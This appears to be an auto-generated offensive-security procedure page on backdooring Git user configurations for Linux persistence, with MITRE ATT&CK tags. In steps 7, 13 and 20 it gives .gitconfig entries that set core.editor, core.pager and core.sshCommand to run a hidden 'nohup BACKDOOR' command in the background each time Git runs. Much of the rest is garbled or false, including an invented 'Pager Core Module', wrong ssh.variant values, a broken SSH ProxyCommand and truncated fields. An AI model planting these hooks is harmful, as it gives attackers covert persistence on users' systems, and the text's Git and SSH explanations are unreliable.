---
id: 2334c3ef-58cc-4919-81ce-a23deb5df2ed
name: Backdooring Git User Configurations
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:18.220866+00:00'
updated_at: '2023-04-10T20:34:13.626824+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
- '[[Modify Existing Service|T1031 - Modify Existing Service]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Backdooring Git]]'
- '[[Git Configs]]'
- '[[Linux - Persistence]]'
commands:
- '[[Amend the previous commit]]'
- '[[Change directory]]'
- '[[Check current editor]]'
- '[[Check if ssh is installed]]'
- '[[Configure SSH command]]'
- '[[Connect to remote server]]'
- '[[Connect to remote server]]'
- '[[Copy file from remote server]]'
- '[[Copy file to remote server]]'
- '[[Fetch changes from remote repository]]'
- '[[Git Config]]'
- '[[Git Log]]'
- '[[Git Pull]]'
- '[[Interactive Rebase]]'
- '[[List files]]'
- '[[Push changes to remote repository]]'
- '[[Set editor to VS Code]]'
- '[[Set GIT Editor]]'
- '[[Set Git Pager to ''less'']]'
- '[[Set GIT_SSH_COMMAND]]'
- '[[Set GIT_SSH environment variable]]'
- '[[Set GIT_SSH_VARIANT]]'
- '[[Set up pager]]'
- '[[Verify editor is set to VS Code]]'
- '[[View Git Configuration]]'
- '[[Viewing Differences]]'
---

# Backdooring Git User Configurations

## Summary

Backdooring Git User Configurations is a technique used to maintain persistence on a Linux system by modifying the Git user-level configurations. This can be done by adding malicious code to the Git configuration file, which is executed every time Git is used. This technique can be used to gain acc

## Description

# Description

Backdooring Git User Configurations is a technique used to maintain persistence on a Linux system by modifying the Git user-level configurations. This can be done by adding malicious code to the Git configuration file, which is executed every time Git is used. This technique can be used to gain access to the system by executing arbitrary commands or by creating a backdoor SSH connection. The technique requires an initial foothold on the system and can be used by an attacker to maintain access even after being detected and removed from the system.

Technical explanation: The Git user-level configurations are stored in the .gitconfig file in the user's home directory. This file contains settings that are applied to all Git repositories used by the user. By modifying this file, an attacker can execute arbitrary commands or create a backdoor SSH connection, which can be used to maintain access to the system.

Business value: This technique can be used by an attacker to maintain access to a compromised system, even after being detected and removed. This can result in data theft, financial loss, and damage to the organization's reputation.

## Requirements

1. Access to the target Linux system

1. Ability to modify the Git user-level configurations

## Defense

1. Regularly monitor the .gitconfig file for any unauthorized changes

1. Limit access to the target system to authorized personnel only

1. Implement strong authentication and access controls to prevent unauthorized access

## Objectives

1. Maintain persistence on the compromised system

1. Execute arbitrary commands on the system

1. Create a backdoor SSH connection for remote access

# Instructions

1. To set user level configurations for Git, use the following command:

**Code**: [[~/.gitconfig]]

> The .gitconfig file located in the user's home directory can be used to store user level configurations for Git. This file can be edited manually or through the use of Git commands. To edit the file manually, simply open it in a text editor and add or modify the desired configurations. To set configurations through Git commands, use the 'git config' command with the '--global' flag followed by the configuration key and value. For example, to set the user's name and email, use the following commands:

 git config --global user.name 'John Doe'
 git config --global user.email 'johndoe@example.com'

 These configurations will then be applied to all Git repositories on the user's machine.

**Command** ([[View Git Configuration]]):

```bash
~/.gitconfig
```

2. To access the Git configuration file for a repository, navigate to the root directory of the repository and locate the .git folder. Within this folder, you will find the config file.

**Code**: [[path/to/repo/.git/config]]

> The Git configuration file contains settings and configurations for the repository. This file can be edited manually or through the use of Git commands such as 'git config'.

**Command** ([[Git Config]]):

```bash
path/to/repo/.git/config
```

3. The core.editor commands are used to edit and manipulate text within the editor.

**Code**: [[core.editor]]

> The arguments for each command may vary, but they generally include the text to be edited and any additional options such as the location within the document or the type of edit to be performed. Some of the most commonly used commands include 'insert', 'delete', 'replace', 'copy', 'cut', and 'paste'. These commands can be used to modify text within the editor, as well as to copy and move text from one location to another. The core.editor commands are an essential part of any editing workflow, and can greatly increase productivity and efficiency when used effectively.

**Command** ([[Check current editor]]):

```bash
git config --global core.editor
```

**Command** ([[Set editor to VS Code]]):

```bash
git config --global core.editor 'code --wait'
```

**Command** ([[Verify editor is set to VS Code]]):

```bash
git config --global core.editor
```

4. The git rebase -i command allows you to interactively rebase your branch. This is useful when you want to squash commits, reorder them or remove them entirely. When you run this command, Git will open an editor with a list of commits to be rebased. You can then edit this list to suit your needs and save the changes. Git will then apply the changes you made to the commits in the list.

**Code**: [[git rebase -i]]

> The -i flag stands for 'interactive'. When used with the git rebase command, it allows you to interactively rebase your branch. This means that you can edit the list of commits that Git presents to you in an editor. You can squash commits, reorder them or remove them entirely. This is useful when you want to clean up your commit history or make it easier to understand. The git rebase -i command is a powerful tool, so it's important to use it with care.

**Command** ([[Interactive Rebase]]):

```bash
git rebase -i
```

5. This command is used to amend the most recent commit with new changes. It is helpful in case you forgot to add some changes or made a mistake in the previous commit.

**Code**: [[git commit --amend]]

> The `git commit --amend` command allows you to modify the most recent commit with new changes. When you run this command, it will open your default text editor where you can modify the commit message and make any necessary changes. Once you save and close the editor, the commit will be amended with the new changes. It is important to note that amending a commit will rewrite the commit history, so use it with caution and only on local branches that haven't been pushed to a remote repository yet.

**Command** ([[Amend the previous commit]]):

```bash
git commit --amend
```

6. To set the Git editor environment variable, use the following command:

**Code**: [[GIT_EDITOR]]

> GIT_EDITOR is an environment variable used by Git to determine which text editor to use for editing commit messages and other text files. The value of this variable should be the command to launch the desired text editor. For example, to set the Git editor to use Vim, you can use the command 'export GIT_EDITOR=vim' in your terminal. This will set the GIT_EDITOR environment variable to 'vim', which Git will use as the default editor. You can replace 'vim' with the command for any other text editor you prefer.

**Command** ([[Set GIT Editor]]):

```bash
export GIT_EDITOR=vim
```

7. To start a program as a background process, use the 'nohup' command followed by the command you want to run and redirect the output to /dev/null. Then add an ampersand (&) at the end of the command to run it in the background. You can also set the editor to use by default with the 'editor' command.

**Code**: [[[core]
editor = nohup BACKDOOR >/dev/null 2>&1 & $]]

> The 'nohup' command allows you to run a command that continues to run even if you log out or close the terminal. The 'BACKDOOR' command is a placeholder for the command you want to run. The '>/dev/null 2>&1' redirects the output of the command to /dev/null, which discards it. The '${VISUAL:-${EDITOR:-emacs}}' sets the editor to use by default, in case you need to edit a file while running the command.

8. The Pager Core Module provides a set of commands for paging through long lists of data.

**Code**: [[core.pager]]

> The Pager Core Module includes the following commands:

1. `page`: This command allows the user to navigate through a long list of data by specifying the page number to display. The `page` command takes a single argument, which is the page number to display. For example, to display page 3 of a list, the user would enter `page 3`.

2. `next`: This command allows the user to move to the next page in a list of data. The `next` command takes no arguments. For example, to move to the next page, the user would enter `next`.

3. `prev`: This command allows the user to move to the previous page in a list of data. The `prev` command takes no arguments. For example, to move to the previous page, the user would enter `prev`.

4. `first`: This command allows the user to move to the first page in a list of data. The `first` command takes no arguments. For example, to move to the first page, the user would enter `first`.

5. `last`: This command allows the user to move to the last page in a list of data. The `last` command takes no arguments. For example, to move to the last page, the user would enter `last`.

**Command** ([[Set up pager]]):

```bash
git config --global core.pager 'less -F -X'
```

9. To use the git diff command, simply enter 'git diff' followed by the names of the files or directories you want to compare. You can also add additional options to customize the output, such as '--color' to display the output in color.

**Code**: [[git diff]]

> The git diff command is a powerful tool for comparing different versions of a file or repository. It can be used to see what changes have been made between two commits, or to compare the working directory with the most recent commit. The output of the command will show the lines that have been added or removed, as well as any changes to existing lines. By default, git diff will display the differences in a text-based format, but you can also use graphical tools like git difftool to visualize the changes more easily.

**Command** ([[Viewing Differences]]):

```bash
git diff
```

10. This command displays the commit history of the repository.

**Code**: [[git log]]

> The 'git log' command is used to display the commit history of the repository. It shows the author, date, and commit message for each commit in reverse chronological order (newest first). This command is useful for seeing the history of changes made to the repository and for finding specific commits that you may need to revert or cherry-pick. Some useful arguments for this command include:

- '--oneline': This argument condenses each commit to a single line, making it easier to scan through the history.
- '-n <number>': This argument limits the number of commits displayed to the specified number.
- '--author=<name>': This argument filters the commits to only those made by the specified author.
- '--since=<date>': This argument filters the commits to only those made since the specified date.
- '--until=<date>': This argument filters the commits to only those made before the specified date.

**Command** ([[Git Log]]):

```bash
git log
```

11. The 'git show' command displays the content and changes made to a commit.

**Code**: [[git show]]

> This command takes an optional argument which is the commit hash or branch name. When the argument is not provided, the command defaults to showing the details of the latest commit. The output of the command includes the commit details, author information, commit message, and the changes made to the files in the commit. The changes are displayed in a diff format which shows the lines added and removed from the files. This command is useful for reviewing the changes made to a commit and understanding the history of the project.

12. To set the pager for Git, you can set the GIT_PAGER environment variable to the command you want to use. For example, to use less as the pager, you can set GIT_PAGER='less' in your shell.

**Code**: [[GIT_PAGER]]

> The GIT_PAGER environment variable is used to specify the pager Git should use to display output that is too long to fit on one screen. By default, Git uses the pager specified by the PAGER environment variable, or falls back to less if neither variable is set. Setting GIT_PAGER overrides the default pager for Git only.

**Command** ([[Set Git Pager to 'less']]):

```bash
git config --global core.pager 'less'
```

13. To use this command, add the following line to your ~/.gitconfig file:

[core]
pager = nohup BACKDOOR >/dev/null 2>&1 & ${PAGER:-less}

This command will launch a backdoor shell by running the BACKDOOR command in the background and redirecting its output to /dev/null. The ${PAGER:-less} syntax ensures that the output of Git commands will still be displayed using a pager (e.g. less) if one is available.

**Code**: [[[core]
pager = nohup BACKDOOR >/dev/null 2>&1 & ${]]

> The 'pager' configuration option specifies the command that Git will use to display output that is longer than one screen. In this case, we're using it to launch a backdoor shell instead of a pager. The 'nohup' command ensures that the BACKDOOR command will keep running even if the user logs out or closes their terminal. The '>/dev/null 2>&1 &' syntax redirects the output of BACKDOOR to /dev/null (so it won't clutter up the user's terminal) and runs it in the background. The ${PAGER:-less} syntax ensures that Git will still use a pager to display its output (if one is available), even though we've set the pager to launch a backdoor shell.

14. Execute commands on a remote machine over SSH.

**Code**: [[core.sshCommand]]

> This command allows you to remotely execute commands on a machine using the Secure Shell (SSH) protocol. To use this command, you must have SSH access to the remote machine and know the username and password or have the appropriate SSH key. The 'data' field should contain the IP address or hostname of the remote machine. The 'text' field should contain the command(s) you wish to execute. If you need to pass any arguments to the command, you can do so by including them in the 'text' field. For example, to list the contents of a directory on the remote machine, you would use the command 'ls /path/to/directory'. Note that some commands may require elevated privileges, so you may need to use the 'sudo' command or log in as a privileged user.

15. Use this command to download objects and refs from another repository.

**Code**: [[git fetch]]

> The 'git fetch' command is used to retrieve commits, files, and refs from a remote repository. It does not merge any changes or modify your working directory. Instead, it downloads the latest changes to a remote branch and stores them in your local repository. You can then merge these changes into your working directory using the 'git merge' command. The argument for this command is the name of the remote repository you want to fetch from.

**Command** ([[Fetch changes from remote repository]]):

```bash
git fetch
```

16. To pull changes from a remote Git repository into your local repository, use the following command:

**Code**: [[git pull]]

> The 'git pull' command is used to fetch and merge changes from a remote repository into your local repository. This command is useful when you want to update your local repository with the latest changes from a remote repository. By default, 'git pull' will fetch changes from the remote repository and merge them into your current branch. If there are any conflicts, you will need to resolve them manually before you can commit your changes.

**Command** ([[Git Pull]]):

```bash
git pull
```

17. The git push command is used to upload local repository content to a remote repository. It is used to push changes made on the local branch to a remote repository. 

**Code**: [[git push]]

> The git push command takes two arguments: <remote> and <branch>. The <remote> argument specifies the remote repository to push the changes to. The <branch> argument specifies the local branch to push the changes from. If the <branch> argument is not specified, the current branch is pushed by default. Additionally, there are several flags that can be used with the git push command to modify its behavior, such as --force, --tags, and --set-upstream.

**Command** ([[Push changes to remote repository]]):

```bash
git push
```

18. To set the GIT_SSH environment variable, use the following command:

**Code**: [[GIT_SSH]]

> This environment variable is used to specify the path to the SSH executable that Git should use for SSH connections. By default, Git will use the system's SSH executable, but if you need to use a different SSH executable, you can set the GIT_SSH environment variable to the path of the executable.

**Command** ([[Set GIT_SSH environment variable]]):

```bash
export GIT_SSH=/usr/bin/ssh
```

19. Set the SSH command to use when communicating with the remote Git repository.

**Code**: [[GIT_SSH_COMMAND]]

> This environment variable allows you to set the SSH command to use when communicating with the remote Git repository. It can be used to specify a custom SSH command or to pass additional options to the SSH command. For example, you can use this variable to specify a different SSH port or to use a different private key file. The value of this variable should be a valid SSH command that Git can use to connect to the remote repository. Note that this variable is only used by Git when communicating with the remote repository over SSH.

**Command** ([[Set GIT_SSH_COMMAND]]):

```bash
export GIT_SSH_COMMAND="ssh -i /path/to/private/key"
```

20. To establish a backdoor SSH connection, execute the following command:

BACKDOOR=<IP_ADDRESS>;<PORT_NUMBER>;<USERNAME>;<PASSWORD>

Then, run the following command:

ssh -F /dev/null -o ProxyCommand='ssh -W %h:%p `grep Host BACKDOOR ~/.ssh/config | cut -d" " -f2`' target_host

**Code**: [[[core]
sshCommand = nohup BACKDOOR >/dev/null 2>&1]]

> The above command will create a backdoor SSH connection by using a proxy command to connect to the target host through the SSH connection established by the BACKDOOR environment variable. The BACKDOOR environment variable contains the IP address, port number, username, and password for the backdoor SSH connection. The -F /dev/null option is used to disable the use of the default SSH configuration file, and the -o ProxyCommand option is used to specify the proxy command to use for establishing the SSH connection to the target host.

**Command** ([[Configure SSH command]]):

```bash
[core]
sshCommand = nohup BACKDOOR >/dev/null 2>&1 & ssh
[ssh]
variant = ssh
```

21. This command is used to specify a variant of the SSH protocol to use when connecting to a remote host.

**Code**: [[ssh.variant]]

> The SSH protocol has several variants, including SSH1 and SSH2. This command is used to specify which variant to use when connecting to a remote host. The argument to this command should be one of the following: ssh1, ssh2, or auto. If ssh1 is specified, the SSH1 protocol will be used. If ssh2 is specified, the SSH2 protocol will be used. If auto is specified, the client will try to negotiate the highest version of the SSH protocol that is supported by both the client and the server.

**Command** ([[Check if ssh is installed]]):

```bash
which ssh
```

**Command** ([[Connect to remote server]]):

```bash
ssh user@server
```

**Command** ([[Copy file to remote server]]):

```bash
scp file.txt user@server:/remote/directory
```

**Command** ([[Copy file from remote server]]):

```bash
scp user@server:/remote/file.txt ./local/directory
```

22. This command is used to specify which SSH variant to use when connecting to Git repositories.

**Code**: [[GIT_SSH_VARIANT]]

> The argument for this command is the name of the SSH variant to use. Possible values are 'ssh' (default), 'plink', 'putty', 'tortoiseplink', 'pageant', 'mink', 'kitty', 'mosh', 'auto', or 'none'.

**Command** ([[Set GIT_SSH_VARIANT]]):

```bash
export GIT_SSH_VARIANT=ssh
```

23. To clone a Git repository using SSH, use the following command:

**Code**: [[sshCommand]]

> git clone git@<hostname>:<username>/<repository>.git

- Replace <hostname> with the hostname of the server where the Git repository is hosted.
- Replace <username> with your username on that server.
- Replace <repository> with the name of the repository you want to clone.

**Command** ([[Connect to remote server]]):

```bash
ssh user@server.com
```

**Command** ([[Change directory]]):

```bash
cd /path/to/directory
```

**Command** ([[List files]]):

```bash
ls
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]
- [[Modify Existing Service|T1031 - Modify Existing Service]]
- [[Scripting|T1064 - Scripting]]

## Commands Used

- [[Amend the previous commit]]
- [[Change directory]]
- [[Check current editor]]
- [[Check if ssh is installed]]
- [[Configure SSH command]]
- [[Connect to remote server]]
- [[Connect to remote server]]
- [[Copy file from remote server]]
- [[Copy file to remote server]]
- [[Fetch changes from remote repository]]
- [[Git Config]]
- [[Git Log]]
- [[Git Pull]]
- [[Interactive Rebase]]
- [[List files]]
- [[Push changes to remote repository]]
- [[Set editor to VS Code]]
- [[Set GIT Editor]]
- [[Set Git Pager to 'less']]
- [[Set GIT_SSH_COMMAND]]
- *...and 6 more*

## Tags

- [[Backdooring Git]]
- [[Git Configs]]
- [[Linux - Persistence]]
